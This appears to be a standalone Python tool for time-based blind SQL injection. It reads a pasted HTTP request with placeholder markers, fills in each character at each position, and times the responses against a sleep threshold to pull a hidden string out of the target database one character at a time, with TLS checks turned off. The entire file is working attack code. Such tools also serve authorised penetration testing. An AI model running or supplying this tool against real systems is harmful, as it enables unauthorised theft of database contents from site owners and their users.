import requests
import time
import sys
import re
import string
from urllib.parse import urlparse

def parse_packet(packet):
    lines = packet.splitlines()
    if not lines:
        return None
    first = lines[0].strip()
    parts = first.split(' ')
    if len(parts) < 3:
        method = parts[0]
        path = parts[1] if len(parts) > 1 else '/'
    else:
        method = parts[0]
        path = parts[1]
    headers = {}
    body = ''
    i = 1
    while i < len(lines) and lines[i].strip() != '':
        line = lines[i].strip()
        if ': ' in line:
            key, val = line.split(': ', 1)
            headers[key] = val
        i += 1
    i += 1
    if i < len(lines):
        body = '\n'.join(lines[i:])
    return {
        'method': method,
        'path': path,
        'headers': headers,
        'body': body
    }

def extract_sleep_time(packet):
    match = re.search(r'sleep\s*\(\s*(\d+)\s*\)', packet, re.IGNORECASE)
    if match:
        return int(match.group(1)) * 1000
    return 3000

def build_url(host, path):
    host = host.strip().rstrip('/')
    if not host.startswith('http://') and not host.startswith('https://'):
        host = 'https://' + host
    if not path.startswith('/'):
        path = '/' + path
    return host + path

def generate_chars():
    chars = list(string.digits)
    chars.append('+')
    chars.extend(string.ascii_lowercase)
    chars.append('_')
    chars.append('-')
    chars.extend(string.ascii_uppercase)
    return chars

def replace_placeholders(text, num, char):
    text = re.sub(r'xxx', str(num), text, flags=re.IGNORECASE)
    text = re.sub(r'fuzz', char, text, flags=re.IGNORECASE)
    return text

def main():
    print("=== Time-Based Blind SQL Injection ===")
    print("Paste your HTTP packet (end with empty line):")
    lines = []
    while True:
        try:
            line = input()
        except EOFError:
            break
        if line == '':
            break
        lines.append(line)
    packet = '\n'.join(lines)
    if not packet:
        print("No packet.")
        return
    
    parsed = parse_packet(packet)
    if not parsed:
        print("Parse error.")
        return
    
    method = parsed['method']
    path = parsed['path']
    headers = parsed['headers']
    body = parsed['body']
    
    threshold_ms = extract_sleep_time(packet)
    print(f"[+] Sleep threshold: {threshold_ms} ms")
    
    start_num = int(input("Start number for XXX: "))
    end_num = int(input("End number for XXX: "))
    
    chars = generate_chars()
    print(f"[+] Using {len(chars)} characters: {''.join(chars)}")
    
    rate_count = int(input("Requests per interval: "))
    rate_ms = int(input("Interval (ms): "))
    delay = (rate_ms / rate_count) / 1000.0
    
    result = {}
    total = 0
    debug = input("Show request details? (y/n): ").lower() == 'y'
    
    print("\n[+] Attack started...")
    for num in range(start_num, end_num + 1):
        found_char = None
        for ch in chars:
            replaced_packet = replace_placeholders(packet, num, ch)
            p = parse_packet(replaced_packet)
            if not p:
                continue
            host = p['headers'].get('Host', '')
            if not host:
                continue
            url = build_url(host, p['path'])
            h = p['headers'].copy()
            h.pop('Host', None)
            h.pop('Connection', None)
            h.pop('Content-Length', None)
            h.pop('Content-Encoding', None)
            
            if debug:
                print(f"\n[DEBUG] URL: {url}")
                print(f"[DEBUG] Headers: {h}")
                if method.upper() == 'POST':
                    print(f"[DEBUG] Body: {p['body']}")
            
            start = time.time()
            try:
                if method.upper() == 'GET':
                    r = requests.get(url, headers=h, timeout=10, verify=False, allow_redirects=False)
                elif method.upper() == 'POST':
                    r = requests.post(url, headers=h, data=p['body'], timeout=10, verify=False, allow_redirects=False)
                else:
                    r = requests.request(method, url, headers=h, data=p['body'], timeout=10, verify=False, allow_redirects=False)
                elapsed = (time.time() - start) * 1000
            except requests.exceptions.Timeout:
                elapsed = 10000
            except Exception as e:
                if debug:
                    print(f"[DEBUG] Error: {e}")
                elapsed = 0
            
            total += 1
            if elapsed >= threshold_ms:
                print(f"[+] XXX={num} CHAR='{ch}' => {elapsed:.0f}ms (HIT)")
                found_char = ch
                break
            else:
                print(f"[-] XXX={num} CHAR='{ch}' => {elapsed:.0f}ms")
            
            if delay > 0:
                time.sleep(delay)
        
        if found_char is not None:
            result[num] = found_char
        else:
            result[num] = '?'
    
    print(f"\n[+] Total requests: {total}")
    output = ''.join(str(result.get(i, '')) for i in range(start_num, end_num+1))
    print(f"\n[+] Extracted string: {output}")
    print("[+] Detailed mapping:")
    for num in range(start_num, end_num+1):
        print(f"  {num} -> {result.get(num, '?')}")

if __name__ == '__main__':
    requests.packages.urllib3.disable_warnings()
    main()
